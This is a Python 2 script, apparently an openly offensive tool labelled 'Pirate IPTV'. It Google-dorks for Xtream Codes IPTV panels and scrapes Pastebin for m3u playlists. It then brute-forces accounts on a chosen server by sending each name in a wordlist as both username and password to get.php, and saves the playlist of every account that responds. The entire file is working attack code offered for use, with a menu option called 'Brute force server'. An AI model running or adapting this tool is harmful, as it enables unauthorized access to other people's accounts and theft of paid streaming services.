#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2, urllib, google, sys, os, time
from urlparse import urlparse
from sys import argv as s
from tqdm import tqdm
from termcolor import colored

class IPTV(object):
	def __init__(self, stdout=None, stderr=None):
		self._stdout = stdout or sys.stdout
		self._stderr = stderr or sys.stderr
		self.lista = 'names.txt'
		self.query = 'Xtream Codes v1.0.59.5 Copyright 2014-2015'
		self.directory = "output"
		self.msg = "Pirate IPTV"
		self.parsedUrls = ['']

	def __enter__(self):
		self.old_stdout, self.old_stderr = sys.stdout, sys.stderr
		self.old_stdout.flush(); self.old_stderr.flush()
		sys.stdout, sys.stderr = self._stdout, self._stderr

	def __exit__(self, exc_type, exc_value, traceback):
		self._stdout.flush(); self._stderr.flush()
		sys.stdout = self.old_stdout
		sys.stderr = self.old_stderr

	def print_link(self):
		with IPTV(stdout=devnull, stderr=devnull):
			for url in google.search(self.query, num=60, stop=1):
				parsed = urlparse(url)
				self.parsedUrls.append(parsed.scheme + '://' + parsed.netloc +"\n")
		time.sleep(1)
		print '\n'.join(self.parsedUrls)

	def search_pastebin(self):
	       	dork = "site:pastebin.com m3u sky .ts"
	       	info_giallo = colored ('[i]','yellow')
	        print (info_giallo + " Dorking google...")
	        url = google.search(dork, num=30, start=0, stop=None, pause=2.0)
	        with IPTV(stdout=devnull, stderr=devnull):
		        for x in url:
		       		s = x.split("http://pastebin.com/")

	        		if(len(s)>1):
		        	    	if s[1].find("/") == -1:
		        	        	#print "[i] Downloading pastie: " + s[1]
	        		    		raw_url = "http://pastebin.com/raw/" + s[1]
			
			                	request = urllib2.urlopen(raw_url)
		        	        	response = request.read()
		
				               	f = open("output_p/"+s[1]+".m3u", "w")
			       	        	f.write(response)
			        	    	f.close()

	def search_account(self,URL, b=1, bsize=1):
		segale_rosso = colored ('[*]','red')
		segale_verde = colored ('[*]','green')
		print (segale_rosso + ' [CTRL + c] = [IPTV Attack Interrupted]')
		t= tqdm()
		last_b = [0]
		righe = open( self.lista ,'r')
		tsize = len(righe.readlines())
		TT = (str(tsize))
		t.total = tsize
		tr = 0
		with open(self.lista) as f:
			content = f.readlines()
		for r in content:
			req = urllib2.Request( URL + '/get.php?username=%s&password=%s&type=m3u&output=mpegts'%(r.rstrip().lstrip(),r.rstrip().lstrip()))
			response = urllib2.urlopen(req)
			the_page = response.read()
			# numero tentativi mancanti
			tsize = (tsize - 1)
			t.update((b - last_b[0]) * bsize)
			last_b[0] = b
			TM = (str(tsize))
			#print ('Mancano ' + TM + ' Tentativi su ' + TT)
			time.sleep(0.2)
			if len(the_page) > 0:
				tr = (tr + 1)
				msg = (segale_verde + " Account found: ")
				print (msg + str(tr))
				new_path = self.directory + "/" + URL.replace("http://", "")
				if os.path.exists(new_path) is False:
					os.makedirs(new_path)
				out_file = open(str(new_path) + "/tv_channels_%s.m3u" % r.rstrip().lstrip(), "w")
				out_file.write(the_page)
				out_file.close()

def menu():
    try:
        print "-= IPTV =-"
        print
        uno = colored ('[1]','green')
        print (uno + " Print server list")
        due = colored ('[2]','green')
        print (due + " Brute force server")
        tre = colored ('[3]','green')
        print (tre + " Pastebin crawl")
        quattro = colored ('[4]','red')
        print (quattro + " Quit")
        print
        selection = input("Select an option: ")

        if(selection==1):
            app.print_link()
            menu()

        elif(selection==2):
            server = raw_input("Server url: ")
            app.search_account(server)
            menu()

        elif(selection==3):
            app.search_pastebin()
            menu()

        elif(selection==4):
            sys.exit(0)

        else:
            print "[!] Invalid option"
            menu()

    except KeyboardInterrupt:
        segale_giallo = colored ('[*]','yellow')
        print ("\r" + segale_giallo + ' IPTV Attack Interrupted')
        sys.exit(0)

if __name__ == "__main__":
    print "- Code by: @Pinperepette @Arm4x @Ludo237"
    app = IPTV()
    devnull = open(os.devnull, 'w')
    menu()
